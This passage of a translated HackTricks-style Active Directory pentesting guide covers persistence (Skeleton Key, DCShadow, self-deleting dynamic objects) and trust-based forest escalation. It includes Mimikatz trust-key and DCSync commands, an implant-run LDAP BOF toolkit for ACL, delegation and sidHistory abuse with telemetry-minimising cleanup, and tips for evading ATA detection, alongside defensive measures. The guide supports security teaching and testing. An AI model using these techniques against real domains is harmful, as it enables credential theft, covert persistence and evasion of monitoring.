滥用 `dynamicObject` 辅助类以创建短期存在的主体/GPO/DNS 记录，配合 `entryTTL`/`msDS-Entry-Time-To-Die` 使用；它们会在不留 tombstones 的情况下自我删除，抹去 LDAP 证据，同时留下孤立的 SIDs、损坏的 `gPLink` 引用或缓存的 DNS 响应（例如，AdminSDHolder ACE 污染或恶意 `gPCFileSysPath`/AD-集成 DNS 重定向）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

在内存中修改 **LSASS** 以建立一个**通用密码**，从而访问所有域帐户。

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建自己的 **SSP** 来**明文捕获**用于访问机器的**凭据**。

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它会在 AD 中注册一个**新的 Domain Controller**，并使用它来**推送属性**（如 SIDHistory、SPNs 等）到指定对象，且**不会留下修改相关的日志**。你需要 DA 权限并在**根域**内。\
注意：如果使用了错误的数据，会产生非常明显的日志。

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

之前我们讨论了如果你有**足够权限读取 LAPS 密码**，如何进行权限提升。然而，这些密码也可以用来**保持持久化**。\
参见：

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着**攻破单个域可能导致整个 Forest 被攻破**。

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许一个 **domain** 的用户访问另一个 **domain** 的资源。它本质上在两个域的认证系统之间建立了联系，使得认证验证可以穿越域边界。当域建立信任时，它们会在各自的 **Domain Controllers (DCs)** 中交换并保存用于信任完整性的特定 **keys**。

在典型场景中，如果用户想访问**受信任域**中的某个服务，首先需要向其所在域的 DC 请求一个称为 **inter-realm TGT** 的特殊票据。这个 TGT 使用双方约定的共享 **key** 加密。随后用户将该 TGT 提交给**受信任域的 DC**以获取服务票据（**TGS**）。在受信任域的 DC 验证 inter-realm TGT 有效后，它会签发 TGS，从而授予用户对该服务的访问权限。

**步骤**：

1. 一台位于 **Domain 1** 的**客户端计算机**通过使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**。
2. 若客户端认证成功，DC1 会签发新的 TGT。
3. 客户端随后向 DC1 请求一个 **inter-realm TGT**，该票据用于访问 **Domain 2** 的资源。
4. inter-realm TGT 使用 DC1 与 DC2 之间共享的 **trust key** 加密（作为双向域信任的一部分）。
5. 客户端携带该 inter-realm TGT 前往 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用其共享的 trust key 验证 inter-realm TGT；若有效，DC2 会为客户端想访问的 Domain 2 内服务器签发 **Ticket Granting Service (TGS)**。
7. 最后，客户端将该 TGS 提交给服务器（该票据使用服务器账户 hash 加密），以获取对 Domain 2 中服务的访问权限。

### Different trusts

重要的是要注意，**信任可以是单向或双向的**。在双向信任中，两个域互相信任；而在**单向**信任关系中，一个域为 **trusted**，另一个为 **trusting**。在后一种情况下，**你只能从被信任域访问信任域内部的资源**。

如果 Domain A 信任 Domain B，则 A 为 trusting domain，B 为 trusted domain。此外，在 **Domain A** 中，这称为 **Outbound trust**；在 **Domain B** 中，则为 **Inbound trust**。

**Different trusting relationships**

- **Parent-Child Trusts**: 这是同一 forest 内的常见设置，子域会自动与其父域建立双向的传递信任（two-way transitive trust）。这意味着父域和子域之间的认证请求可以无缝流动。
- **Cross-link Trusts**: 称为“shortcut trusts”，这些信任在子域之间建立以加快引用流程。在复杂的森林结构中，认证引用通常必须先上到 forest 根再下到目标域；通过创建 cross-links 可以缩短这一路径，尤其适用于地理分布广泛的环境。
- **External Trusts**: 这些信任在不同且无关联的域之间建立，且本质上是非传递性的。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 在访问不在当前 forest 且未由 forest trust 连接的域中的资源时很有用。通过对外部信任启用 SID 过滤可以增强安全性。
- **Tree-root Trusts**: 这些信任在 forest 根域与新添加的 tree root 之间自动建立。虽然不常见，但 tree-root trusts 对向森林添加新的域树很重要，允许它们保持独特的域名并确保双向传递性。更多信息见 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**: 这是一种在两个 forest 根域之间建立的双向传递信任，同时通过 SID 过滤来增强安全措施。
- **MIT Trusts**: 这些信任与非 Windows、符合 [RFC4120](https://tools.ietf.org/html/rfc4120) 的 Kerberos 域建立。MIT trusts 更为专用，适用于需要与 Windows 生态外的 Kerberos 系统集成的环境。

#### Other differences in **trusting relationships**

- 信任关系也可以是**传递性的**（A 信任 B，B 信任 C，则 A 信任 C）或**非传递性的**。
- 信任关系可以设置为**双向信任**（双方互相信任）或**单向信任**（仅其中一方信任另一方）。

### Attack Path

1. **枚举**信任关系
2. 检查是否有任何**安全主体**（user/group/computer）对**另一个域**的资源具有**访问权限**，可能通过 ACE 条目或作为另一个域的组成员。查找**跨域的关系**（信任可能是为此建立的）。
1. 在这种情况下，kerberoast 也可能是另一种选择。
3. **攻破**那些可以**跨域 pivot** 的**账户**。

攻击者可以通过三种主要机制访问另一个域中的资源：

- **Local Group Membership**：主体可能被添加到机器的本地组，例如服务器上的 “Administrators” 组，从而获得对该机器的重大控制权。
- **Foreign Domain Group Membership**：主体也可能是外部域内某些组的成员。不过这种方法的有效性取决于信任的性质和该组的范围。
- **Access Control Lists (ACLs)**：主体可能被列在 **ACL** 中，尤其是在 **DACL** 的 **ACE** 条目中，从而获得对特定资源的访问。想深入了解 ACL、DACL 和 ACE 机制的人可以参考白皮书 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 。

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** 来查找域内的 foreign security principals。这些将是来自**外部域/林**的用户/组。

你可以在 **Bloodhound** 中检查，或使用 powerview：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任的其他方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
> You can the one used by the current domain them with:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

通过滥用信任并使用 SID-History injection，将权限提升为 Enterprise admin 以进入 child/parent domain：

{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

理解如何利用 Configuration Naming Context (NC) 至关重要。Configuration NC 在 Active Directory (AD) 环境中作为跨林的配置数据中央存储。该数据会复制到林中每个 Domain Controller (DC)，可写的 DC 保持 Configuration NC 的可写副本。要利用它，必须在某个 DC 上拥有 **SYSTEM privileges on a DC**，最好是 child DC。

**Link GPO to root DC site**

Configuration NC 的 Sites 容器包含有关 AD 林中所有域加入计算机站点的信息。在任何 DC 上以 SYSTEM 权限操作时，攻击者可以将 GPO 链接到 root DC sites。此操作可能通过操控应用于这些站点的策略来危及 root domain。

有关详细信息，可参阅有关研究 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)。

**Compromise any gMSA in the forest**

一种攻击向量是针对域内特权 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。在任何 DC 上拥有 SYSTEM 权限时，可以访问 KDS Root key 并计算林中任何 gMSA 的密码。

详细分析和逐步指南可以在以下找到：

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的委派 MSA 攻击（BadSuccessor – abusing migration attributes）：

{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

附加外部研究：[Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)。

**Schema change attack**

此方法需要耐心，等待新特权 AD 对象的创建。拥有 SYSTEM 权限后，攻击者可以修改 AD Schema，授予任意用户对所有类的完全控制权。这可能导致对新创建的 AD 对象的未授权访问和控制。

更多阅读请参见 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)。

**From DA to EA with ADCS ESC5**

ADCS ESC5 漏洞针对对 PKI 对象的控制，以创建允许在林内以任何用户身份进行身份验证的证书模板。由于 PKI 对象位于 Configuration NC，妥协可写的 child DC 可使得 ESC5 攻击得以执行。

关于此的更多细节可见 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)。在没有 ADCS 的情形下，攻击者也能够搭建必要组件，详见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在这个场景中，**your domain is trusted** 被一个 external domain 信任，赋予你对它的**undetermined permissions**。你需要找出 **which principals of your domain have which access over the external domain**，然后尝试利用这些权限：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In this scenario **你的域** 正在 **信任** 来自 **不同域** 的主体的一些 **privileges**。

然而，当一个 **域被 trusting 域信任** 时，被信任的域会 **创建一个用户**，该用户使用 **可预测的名称**，并将 **trusted password** 作为 **password**。这意味着可以 **访问 trusting 域的某个用户以进入被信任域** 来枚举并尝试提升更多权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种入侵被信任域的方法是找到在域信任的**相反方向**上创建的 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这种情况不太常见）。

另一种入侵被信任域的方法是等待在一台 **trusted domain 的用户可以通过 RDP 登录** 的机器上。然后，攻击者可以向 RDP 会话进程注入代码，并从那里 **访问受害者的 origin domain**。\
此外，如果 **受害者挂载了他的硬盘**，攻击者可以从 **RDP session** 进程在 **硬盘的 startup folder** 中存放 **backdoors**。这种技术称为 **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- 利用 SID history 属性跨林信任发起攻击的风险通过 SID Filtering 得到缓解，SID Filtering 在所有跨林信任上默认启用。这基于 Microsoft 的立场，即将 forest（而非 domain）视为安全边界，因此假定 intra-forest trusts 是安全的。
- 不过，有个问题：SID filtering 可能会影响应用程序和用户访问，因此有时会被禁用。

### **Selective Authentication:**

- 对于 inter-forest trusts，使用 Selective Authentication 可确保来自两个 forest 的用户不会被自动认证。相反，需要为用户显式授予访问 trusting domain 或 forest 中域和服务器的权限。
- 需要注意的是，这些措施无法防止对可写的 Configuration Naming Context (NC) 的利用，或对 trust account 的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## 基于 LDAP 的 AD 滥用（来自 On-Host Implants）

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD-style 的 LDAP 原语重新实现为 x64 Beacon Object Files，这些文件完全在 on-host implant（例如 Adaptix C2）内运行。操作者用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该包，加载 `ldap.axs`，然后从 beacon 调用 `ldap <subcommand>`。所有流量都在当前登录的安全上下文下通过 LDAP (389)（带 signing/sealing）或 LDAPS (636)（带自动证书信任）传输，因此不需要 socks 代理或磁盘痕迹。

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` 将短名/OU 路径解析为完整 DNs 并导出相应对象。
- `get-object`, `get-attribute`, and `get-domaininfo` 拉取任意属性（包括 security descriptors）以及来自 `rootDSE` 的 forest/domain 元数据。
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` 直接从 LDAP 暴露 roasting candidates、delegation settings，以及现有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 描述符。
- `get-acl` and `get-writable --detailed` 解析 DACL，列出 trustees、rights（GenericAll/WriteDACL/WriteOwner/attribute writes）和继承信息，为 ACL privilege escalation 提供直接目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 写入原语用于提权与持久化

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) 允许操作员在拥有 OU 权限的任意位置预置新主体或机器账户。`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 在发现 write-property 权限后可直接劫持目标。
- 以 ACL 为中心的命令（如 `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync`）将 WriteDACL/WriteOwner 权限在任意 AD 对象上转换为密码重置、组成员控制或 DCSync 复制权限，而不会留下 PowerShell/ADSI 痕迹。对应的 `remove-*` 命令可清理注入的 ACE。

### 委派、roasting 与 Kerberos 滥用

- `add-spn`/`set-spn` 可立即使被攻破的用户变为 Kerberoastable；`add-asreproastable`（UAC 切换）在不修改密码的情况下将其标记为可进行 AS-REP roasting。
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) 可从 beacon 修改 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，从而启用 constrained/unconstrained/RBCD 攻击路径，并消除了远程 PowerShell 或 RSAT 的需求。

### sidHistory 注入、OU 迁移与攻击面塑造

- `add-sidhistory` 将特权 SID 注入受控主体的 SID history（参见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 提供隐蔽的访问继承。
- `move-object` 更改计算机或用户的 DN/OU，使攻击者能将资产拖入已有委派权限的 OU，然后滥用 `set-password`、`add-groupmember` 或 `add-spn`。
- 范围严格的移除命令（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）允许在操作员收集完凭证或持久化后迅速回滚，最小化遥测暴露。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**：建议 Domain Admins 仅允许登录到 Domain Controllers，避免在其他主机上使用。
- **Service Account Privileges**：服务不应以 Domain Admin (DA) 权限运行以保持安全。
- **Temporal Privilege Limitation**：对于需要 DA 权限的任务，应限制其持续时间。可通过如下方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**：审计 Event IDs 2889/3074/3075，然后在 DCs/clients 上强制启用 LDAP signing 以及 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- 实施欺骗涉及设置陷阱，例如设置诱饵用户或计算机，具备如密码不过期或被标记为 Trusted for Delegation 等特性。具体方法包括创建具有特定权限的用户或将其添加到高权限组中。
- 一个实际示例使用的命令：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 有关部署欺骗技术的更多信息，请参见 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)。

### **Identifying Deception**

- **For User Objects**：可疑指标包括不典型的 ObjectSID、较少的登录次数、创建日期异常以及较低的坏密码计数。
- **General Indicators**：将潜在诱饵对象的属性与真实对象进行比较可发现不一致之处。像 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 这样的工具可以帮助识别此类欺骗。

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**：
- **User Enumeration**：避免在 Domain Controllers 上进行会话枚举以防触发 ATA 检测。
- **Ticket Impersonation**：使用 **aes** 密钥创建票证有助于规避检测，因为不会降级为 NTLM。
- **DCSync Attacks**：建议从非 Domain Controller 上执行以避免 ATA 检测，直接从 Domain Controller 执行会触发告警。

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
